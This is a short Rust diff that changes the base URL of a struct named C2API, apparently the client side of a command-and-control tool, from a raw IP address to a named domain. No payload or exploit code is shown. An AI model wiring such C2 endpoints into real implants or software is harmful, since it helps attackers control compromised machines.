@@ -17,7 +17,7 @@ pub struct C2API {
 impl C2API {
     pub fn new() -> Self {
         C2API {
-            base_url: String::from_str("https://15.237.20.80:5000/api/").unwrap(),
+            base_url: String::from_str("https://cthulhu.hecque.fr:5000/api/").unwrap(),
         }
     }
 
